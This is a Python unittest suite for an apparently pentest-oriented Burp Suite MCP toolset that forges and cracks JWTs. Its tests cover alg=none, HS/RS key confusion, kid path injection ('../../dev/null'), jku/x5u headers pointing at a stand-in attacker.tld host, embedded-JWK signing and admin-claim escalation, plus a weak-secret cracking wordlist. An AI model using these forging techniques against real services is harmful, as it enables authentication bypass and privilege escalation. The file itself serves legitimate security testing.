"""Calibration tests for forge_jwt + crack_jwt_secret + _jwt_codec.

forge_jwt and crack_jwt are async MCP tools — we test them via their inner
helpers + the codec layer so the suite stays HTTP-free and deterministic.

Run: uv run python -m unittest tests.test_jwt_forge -v
"""

import base64
import hmac
import hashlib
import json
import unittest

from burpsuite_mcp.tools.auth._jwt_codec import (
    b64url_decode,
    b64url_encode,
    decode_header,
    decode_payload,
    encode_segment,
    generate_rsa_keypair_for_embed,
    sign_hmac,
    sign_rsa,
    split_jwt,
    verify_hmac,
)
from burpsuite_mcp.tools.auth.forge_jwt import (
    _forge_alg_none,
    _forge_claim_swap,
    _forge_hs_confusion,
    _forge_jwk_embed,
    _forge_kid_inject,
    _forge_url_header,
)
from burpsuite_mcp.tools.auth._jwt_wordlist import JWT_DEFAULT_WORDLIST


# A baseline HS256 token signed with secret="secret".
_HS_HEADER = {"alg": "HS256", "typ": "JWT"}
_HS_PAYLOAD = {"sub": "user1", "role": "user"}
_HS_SECRET = b"secret"


def _build_hs256(secret: bytes = _HS_SECRET, claims: dict | None = None) -> str:
    payload = {**_HS_PAYLOAD, **(claims or {})}
    h_b64 = encode_segment(_HS_HEADER)
    p_b64 = encode_segment(payload)
    sig = sign_hmac("HS256", f"{h_b64}.{p_b64}".encode(), secret)
    sig_b64 = b64url_encode(sig)
    return f"{h_b64}.{p_b64}.{sig_b64}"


class Base64UrlTests(unittest.TestCase):
    def test_roundtrip(self):
        for b in (b"", b"x", b"hello", b"\x00\xff\x80"):
            self.assertEqual(b64url_decode(b64url_encode(b)), b)

    def test_decode_unpadded(self):
        # JWT segments strip = padding.
        encoded = base64.urlsafe_b64encode(b"hello").rstrip(b"=").decode()
        self.assertEqual(b64url_decode(encoded), b"hello")

    def test_encode_omits_padding(self):
        enc = b64url_encode(b"hello")
        self.assertNotIn("=", enc)


class SplitJwtTests(unittest.TestCase):
    def test_three_parts(self):
        h, p, s = split_jwt("a.b.c")
        self.assertEqual((h, p, s), ("a", "b", "c"))

    def test_two_parts_raises(self):
        with self.assertRaises(ValueError):
            split_jwt("a.b")

    def test_four_parts_raises(self):
        with self.assertRaises(ValueError):
            split_jwt("a.b.c.d")


class HmacSignVerifyTests(unittest.TestCase):
    def test_sign_matches_stdlib(self):
        sig = sign_hmac("HS256", b"hello", b"secret")
        expected = hmac.new(b"secret", b"hello", hashlib.sha256).digest()
        self.assertEqual(sig, expected)

    def test_verify_correct_secret(self):
        token = _build_hs256()
        self.assertTrue(verify_hmac("HS256", token, b"secret"))

    def test_verify_wrong_secret(self):
        token = _build_hs256()
        self.assertFalse(verify_hmac("HS256", token, b"wrong"))

    def test_unsupported_alg_raises(self):
        with self.assertRaises(ValueError):
            sign_hmac("HS999", b"x", b"k")


class ForgeAlgNoneTests(unittest.TestCase):
    def test_signature_empty_after_forge(self):
        original = _build_hs256()
        forged, _ = _forge_alg_none(original, {})
        self.assertTrue(forged.endswith("."))

    def test_header_alg_is_none(self):
        original = _build_hs256()
        forged, _ = _forge_alg_none(original, {})
        self.assertEqual(decode_header(forged)["alg"], "none")

    def test_claim_changes_applied(self):
        original = _build_hs256()
        forged, _ = _forge_alg_none(original, {"role": "admin", "sub": "victim"})
        payload = decode_payload(forged)
        self.assertEqual(payload["role"], "admin")
        self.assertEqual(payload["sub"], "victim")


class ForgeHsConfusionTests(unittest.TestCase):
    def test_requires_public_key(self):
        original = _build_hs256()
        with self.assertRaises(ValueError):
            _forge_hs_confusion(original, "", {})

    def test_signed_with_pem_bytes(self):
        original = _build_hs256()
        fake_pem = "-----BEGIN PUBLIC KEY-----\nABCDEF\n-----END PUBLIC KEY-----\n"
        forged, note = _forge_hs_confusion(original, fake_pem, {"role": "admin"})
        # Verify the forged signature matches HMAC-SHA256 of the signing input
        # using the PEM string as the secret.
        h, p, sig_b64 = split_jwt(forged)
        signing_input = f"{h}.{p}".encode()
        expected_sig = sign_hmac("HS256", signing_input, fake_pem.encode())
        self.assertEqual(b64url_decode(sig_b64), expected_sig)

    def test_header_alg_flipped(self):
        original = _build_hs256()
        fake_pem = "PEM"
        forged, _ = _forge_hs_confusion(original, fake_pem, {})
        self.assertEqual(decode_header(forged)["alg"], "HS256")


class ForgeKidInjectTests(unittest.TestCase):
    def test_kid_value_in_header(self):
        original = _build_hs256()
        forged, _ = _forge_kid_inject(
            original, "../../dev/null", b"", {"role": "admin"})
        h = decode_header(forged)
        self.assertEqual(h["kid"], "../../dev/null")

    def test_empty_secret_verifies(self):
        # Classic /dev/null exploit: server reads empty key, HMAC(empty, x).
        original = _build_hs256()
        forged, _ = _forge_kid_inject(original, "/dev/null", b"", {})
        # The forged token should verify with empty-bytes secret.
        self.assertTrue(verify_hmac("HS256", forged, b""))

    def test_claim_changes_propagate(self):
        original = _build_hs256()
        forged, _ = _forge_kid_inject(original, "/x", b"abc",
                                      {"is_admin": True})
        self.assertTrue(decode_payload(forged)["is_admin"])


class ForgeUrlHeaderTests(unittest.TestCase):
    def test_jku_in_header(self):
        original = _build_hs256()
        forged, _ = _forge_url_header(
            original, "jku", "https://attacker.tld/jwks.json", {})
        h = decode_header(forged)
        self.assertEqual(h["jku"], "https://attacker.tld/jwks.json")

    def test_x5u_in_header(self):
        original = _build_hs256()
        forged, _ = _forge_url_header(
            original, "x5u", "https://attacker.tld/cert.pem", {})
        self.assertEqual(decode_header(forged)["x5u"],
                         "https://attacker.tld/cert.pem")

    def test_empty_url_rejected(self):
        original = _build_hs256()
        with self.assertRaises(ValueError):
            _forge_url_header(original, "jku", "", {})


class ForgeClaimSwapTests(unittest.TestCase):
    def test_requires_secret_or_alg_none(self):
        original = _build_hs256()
        with self.assertRaises(ValueError):
            _forge_claim_swap(original, {"role": "admin"}, None, False)

    def test_resigns_with_known_secret(self):
        original = _build_hs256()
        forged, _ = _forge_claim_swap(
            original, {"role": "admin"}, b"secret", False)
        # Forged token should verify under the same secret.
        self.assertTrue(verify_hmac("HS256", forged, b"secret"))
        self.assertEqual(decode_payload(forged)["role"], "admin")

    def test_alg_none_path_strips_signature(self):
        original = _build_hs256()
        forged, _ = _forge_claim_swap(
            original, {"role": "admin"}, None, True)
        self.assertEqual(decode_header(forged)["alg"], "none")
        self.assertTrue(forged.endswith("."))


class ForgeJwkEmbedTests(unittest.TestCase):
    def test_embedded_jwk_in_header(self):
        original = _build_hs256()
        forged, _, priv_pem = _forge_jwk_embed(original, {"sub": "victim"})
        h = decode_header(forged)
        self.assertIn("jwk", h)
        self.assertEqual(h["jwk"]["kty"], "RSA")
        self.assertIn("n", h["jwk"])
        self.assertIn("e", h["jwk"])

    def test_signs_with_matching_private_key(self):
        original = _build_hs256()
        forged, _, priv_pem = _forge_jwk_embed(original, {})
        # Reconstruct: sign with returned PEM, compare to forged signature.
        h_b64, p_b64, sig_b64 = split_jwt(forged)
        expected = sign_rsa("RS256",
                            f"{h_b64}.{p_b64}".encode(),
                            priv_pem.encode())
        self.assertEqual(b64url_decode(sig_b64), expected)

    def test_claim_changes_propagate(self):
        original = _build_hs256()
        forged, _, _ = _forge_jwk_embed(original, {"role": "admin"})
        self.assertEqual(decode_payload(forged)["role"], "admin")


class GenerateRsaKeypairTests(unittest.TestCase):
    def test_keypair_returns_pem_and_jwk(self):
        priv_pem, jwk = generate_rsa_keypair_for_embed(bits=2048)
        self.assertIn(b"BEGIN PRIVATE KEY", priv_pem)
        self.assertEqual(jwk["kty"], "RSA")
        self.assertEqual(jwk["alg"], "RS256")
        self.assertEqual(jwk["use"], "sig")

    def test_n_and_e_are_b64url(self):
        _, jwk = generate_rsa_keypair_for_embed(bits=2048)
        # Should be decodable as urlsafe base64.
        b64url_decode(jwk["n"])
        b64url_decode(jwk["e"])

    def test_each_call_produces_distinct_key(self):
        _, jwk1 = generate_rsa_keypair_for_embed(bits=2048)
        _, jwk2 = generate_rsa_keypair_for_embed(bits=2048)
        self.assertNotEqual(jwk1["n"], jwk2["n"])


class WordlistInvariantTests(unittest.TestCase):
    def test_wordlist_non_empty(self):
        self.assertGreater(len(JWT_DEFAULT_WORDLIST), 100)

    def test_top_entries_include_classics(self):
        for must in ("", "secret", "password", "your-256-bit-secret",
                     "change-me", "admin"):
            self.assertIn(must, JWT_DEFAULT_WORDLIST,
                          f"{must!r} missing from wordlist")

    def test_no_duplicates(self):
        self.assertEqual(len(JWT_DEFAULT_WORDLIST),
                         len(set(JWT_DEFAULT_WORDLIST)),
                         "wordlist contains duplicates — wastes brute attempts")


class CrackEndToEndTests(unittest.TestCase):
    """Verify the verify_hmac + wordlist path actually finds easy secrets."""

    def test_finds_secret_in_default_list(self):
        token = _build_hs256(secret=b"secret")
        hit = next((w for w in JWT_DEFAULT_WORDLIST
                    if verify_hmac("HS256", token, w.encode())), None)
        self.assertEqual(hit, "secret")

    def test_does_not_false_positive_on_strong(self):
        token = _build_hs256(secret=b"\x00" * 64 + b"very-long-random-not-in-list")
        hit = next((w for w in JWT_DEFAULT_WORDLIST
                    if verify_hmac("HS256", token, w.encode())), None)
        self.assertIsNone(hit)


if __name__ == "__main__":
    unittest.main()
